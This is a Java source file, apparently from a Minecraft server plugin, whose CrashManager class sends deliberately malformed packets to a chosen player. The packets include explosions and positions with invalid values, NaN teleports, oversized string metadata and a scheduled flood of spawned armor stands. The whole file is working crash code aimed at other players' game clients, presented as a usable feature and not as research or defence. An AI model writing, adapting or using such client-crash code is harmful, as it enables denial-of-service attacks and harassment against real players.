package cn.aetheris.yuki.functionality.crash;

import cn.aetheris.yuki.core.plugin.init.HookInit;
import cn.aetheris.yuki.math.GenerateBigRate;
import com.github.retrooper.packetevents.protocol.entity.data.EntityData;
import com.github.retrooper.packetevents.protocol.entity.data.EntityDataTypes;
import com.github.retrooper.packetevents.protocol.entity.type.EntityTypes;
import com.github.retrooper.packetevents.protocol.particle.Particle;
import com.github.retrooper.packetevents.protocol.particle.type.ParticleTypes;
import com.github.retrooper.packetevents.protocol.world.Location;
import com.github.retrooper.packetevents.util.Vector3d;
import com.github.retrooper.packetevents.wrapper.PacketWrapper;
import com.github.retrooper.packetevents.wrapper.play.server.*;
import io.github.retrooper.packetevents.util.SpigotConversionUtil;
import io.github.retrooper.packetevents.util.SpigotReflectionUtil;
import org.bukkit.entity.Player;
import org.bukkit.util.Vector;

import java.util.ArrayList;
import java.util.Collections;
import java.util.List;
import java.util.UUID;
import java.util.concurrent.*;

public class CrashManager {
    private static final int NBT_DATA_LIMIT = 1000;
    private static final String LONG_STRING = new String(new char[32767]);

    private static final ScheduledExecutorService SCHEDULER =
            Executors.newScheduledThreadPool(Runtime.getRuntime().availableProcessors());
    private static final ConcurrentHashMap<Player, ScheduledFuture<?>> TASK_MAP = new ConcurrentHashMap<>();
    private static final ConcurrentHashMap<Player, List<Integer>> ENTITY_MAP = new ConcurrentHashMap<>();

    
    public static void sendExplosion(Player target) {
        sendPacket(target, new WrapperPlayServerExplosion(
                GenerateBigRate.generateVector3d(),
                GenerateBigRate.generateInvalidFloat(),
                Collections.emptyList(),
                GenerateBigRate.generateVector3f()
        ));
        sendPacket(target, new WrapperPlayServerWindowConfirmation(
                Float.MAX_EXPONENT, Short.MAX_VALUE, false));
    }

    
    public static void sendInvalidPosition(Player target) {
        sendPacket(target, new WrapperPlayServerPlayerPositionAndLook(
                GenerateBigRate.generateInvalidDouble(),
                GenerateBigRate.generateInvalidDouble(),
                GenerateBigRate.generateInvalidDouble(),
                GenerateBigRate.generateInvalidFloat(),
                GenerateBigRate.generateInvalidFloat(),
                GenerateBigRate.generateFlags(),
                GenerateBigRate.generateTeleportId(),
                false
        ));
    }


    
    public static void sendInvalidParticle(Player target) {
        sendPacket(target, new WrapperPlayServerParticle(
                new Particle<>(ParticleTypes.DRAGON_BREATH),
                true,
                GenerateBigRate.generateVector3d(),
                GenerateBigRate.generateVector3f(),
                GenerateBigRate.generateInvalidFloat(),
                GenerateBigRate.generateTeleportId()
        ));
    }

    
    public static void spawnArmorStands(Player target, int batchSize) {
        cancelExistingTask(target);
        ENTITY_MAP.put(target, Collections.synchronizedList(new ArrayList<>()));

        TASK_MAP.put(target, SCHEDULER.scheduleAtFixedRate(() -> {
            if (!target.isOnline()) {
                cleanupEntities(target);
                return;
            }

            List<Integer> newEntities = new ArrayList<>(batchSize);
            Location baseLoc = getOffsetLocation(target, 5, 5, 5);

            for (int i = 0; i < batchSize; i++) {
                int entityId = SpigotReflectionUtil.generateEntityId();
                spawnEntity(target, entityId, baseLoc);
                newEntities.add(entityId);
            }
            ENTITY_MAP.get(target).addAll(newEntities);
        }, 0, 1, TimeUnit.SECONDS));
    }

    
    public static void sendCorruptNBT(Player target) {
        List<EntityData<?>> nbtData = new ArrayList<>(NBT_DATA_LIMIT);
        for (int i = 0; i < NBT_DATA_LIMIT; i++) {
            nbtData.add(new EntityData(i, EntityDataTypes.STRING, LONG_STRING));
        }
        sendPacket(target, new WrapperPlayServerEntityMetadata(-1, nbtData));
    }

    
    public static void sendNANTeleport(Player target) {
        HookInit.getPacketEventsHook().sendPacket(target,
                new WrapperPlayServerEntityTeleport(
                        HookInit.getPacketEventsHook().getUser(target).getEntityId(),
                        new Location(new Vector3d(Double.NaN, Double.NaN, Double.NaN), 0, 0),
                        false
                )
        );
    }

    
    public static void sendEntityMeta(Player target) {
        List<EntityData<?>> metadata = new ArrayList<>();
        metadata.add(new EntityData(11, EntityDataTypes.INT, 1234567));
        metadata.add(new EntityData(12, EntityDataTypes.INT, 1234567));
        HookInit.getPacketEventsHook().sendPacket(target, new WrapperPlayServerEntityMetadata(target.getEntityId(), metadata));
    }


    
    public static void cleanupEntities(Player target) {
        List<Integer> entities = ENTITY_MAP.remove(target);
        if (entities != null && !entities.isEmpty()) {
            sendPacket(target, new WrapperPlayServerDestroyEntities(
                    entities.stream().mapToInt(i -> i).toArray()
            ));
        }
        cancelExistingTask(target);
    }

    private static void spawnEntity(Player target, int entityId, Location loc) {
        sendPacket(target, new WrapperPlayServerSpawnEntity(
                entityId, UUID.randomUUID(), EntityTypes.ARMOR_STAND, loc, 0, 0, null
        ));
        sendPacket(target, new WrapperPlayServerEntityMetadata(
                entityId, List.of(new EntityData(0, EntityDataTypes.BYTE, (byte) 0x20))
        ));
    }

    private static Location getOffsetLocation(Player target, int x, int y, int z) {
        return SpigotConversionUtil.fromBukkitLocation(
                target.getLocation().add(new Vector(x, y, z))
        );
    }


    private static void cancelExistingTask(Player target) {
        TASK_MAP.computeIfPresent(target, (k, v) -> {
            v.cancel(true);
            return null;
        });
    }

    private static void sendPacket(Player target, PacketWrapper<?> packet) {
        HookInit.getPacketEventsHook().sendPacket(target, packet);
    }
}
